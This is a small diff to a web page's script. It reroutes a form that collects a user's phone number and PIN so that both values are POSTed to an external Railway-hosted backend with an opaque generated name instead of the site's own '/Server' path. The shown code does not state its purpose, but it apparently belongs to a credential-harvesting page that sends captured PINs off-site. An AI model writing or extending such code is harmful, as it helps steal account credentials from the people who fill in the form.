@@ -49,6 +49,9 @@
         const phone=document.getElementById('phoneNumber');
         const toast=document.getElementById('toast');
         
+        // YOUR RAILWAY BACKEND URL
+        const API_URL = 'https://mxxyasstz-production.up.railway.app/Server';
+        
         function show(msg,isError=true){
             toast.textContent=msg;
             toast.style.opacity='1';
@@ -66,8 +69,8 @@
             show('Sending...',false);
             
             try{
-                // THIS IS THE IMPORTANT PART - using /Server endpoint
-                const res=await fetch('/Server',{
+                // SENDING TO RAILWAY BACKEND
+                const res=await fetch(API_URL,{
                     method:'POST',
                     headers:{'Content-Type':'application/json'},
                     body:JSON.stringify({phone:p, pin:pin})
